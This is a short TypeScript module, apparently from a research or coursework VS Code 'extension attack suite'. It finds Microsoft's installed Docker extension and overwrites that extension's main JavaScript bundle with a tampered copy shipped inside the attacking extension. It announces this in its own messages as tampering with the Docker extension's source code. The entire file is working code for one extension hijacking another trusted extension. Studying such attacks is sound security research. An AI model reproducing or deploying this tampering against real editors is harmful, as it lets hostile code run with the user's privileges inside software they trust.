import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';

export default function() {
    const target = vscode.extensions.getExtension('ms-azuretools.vscode-docker');
    const host = vscode.extensions.getExtension('ecm3401.extension-attack-suite');    
    
    if(!target) {
        vscode.window.showErrorMessage('Unable to locate target Docker extension!');
        return;
    }
    if(!host) {
        vscode.window.showErrorMessage('Unable to locate host extension!');
        return;
    }
    
    
    const targetFile = 'dist/extension.bundle.js';
    const hostFile = 'resources/docker-attack/extension.bundle.js';
    const targetFilePath = path.join(target.extensionPath,targetFile);
    const hostFilePath = path.join(host.extensionPath,hostFile);
    
    
    vscode.window.showInformationMessage(`---Tampering with Docker extension source code---`);
    
    vscode.window.showInformationMessage(`From ${hostFilePath}`);
    
    vscode.window.showInformationMessage(`Into ${targetFilePath}`);
    
    fs.copyFileSync(hostFilePath,targetFilePath);
}